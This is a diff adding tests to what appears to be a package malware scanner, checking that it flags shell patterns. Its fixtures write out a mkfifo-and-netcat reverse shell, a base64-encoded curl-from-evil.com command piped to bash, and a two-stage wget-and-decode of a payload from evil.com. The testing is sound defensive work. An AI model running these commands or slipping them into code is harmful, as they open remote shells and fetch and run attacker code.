@@ -119,6 +119,54 @@ async function runShellTests() {
       assert(t, 'Should detect env var wrapped curl|sh');
     } finally { cleanupTemp(tmp); }
   });
+
+  // =============================================
+  // v2.5.14: B14/B15 — New shell patterns
+  // =============================================
+
+  await asyncTest('SHELL B14: mkfifo + nc reverse shell — detected', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'exploit.sh'), 'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'fifo_nc_reverse_shell');
+      assert(t, 'mkfifo + nc pattern should be detected as fifo_nc_reverse_shell');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL B15: base64 -d | bash — detected', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'exploit.sh'), 'echo "Y3VybCBodHRwOi8vZXZpbC5jb20vcy5zaA==" | base64 -d | bash');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'base64_decode_exec');
+      assert(t, 'base64 -d | bash should be detected as base64_decode_exec');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL B15: wget + base64 -d two-stage — detected', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'exploit.sh'), 'wget http://evil.com/payload.b64 -O /tmp/p.b64 && base64 -d /tmp/p.b64 > /tmp/p && chmod +x /tmp/p');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'wget_base64_decode');
+      assert(t, 'wget + base64 -d should be detected as wget_base64_decode');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL B15 negative: base64 -d without pipe to bash — NOT detected', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'safe.sh'), 'base64 -d cert.pem.b64 > cert.pem');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'base64_decode_exec');
+      assert(!t, 'base64 -d without pipe to bash should NOT be detected');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runShellTests };
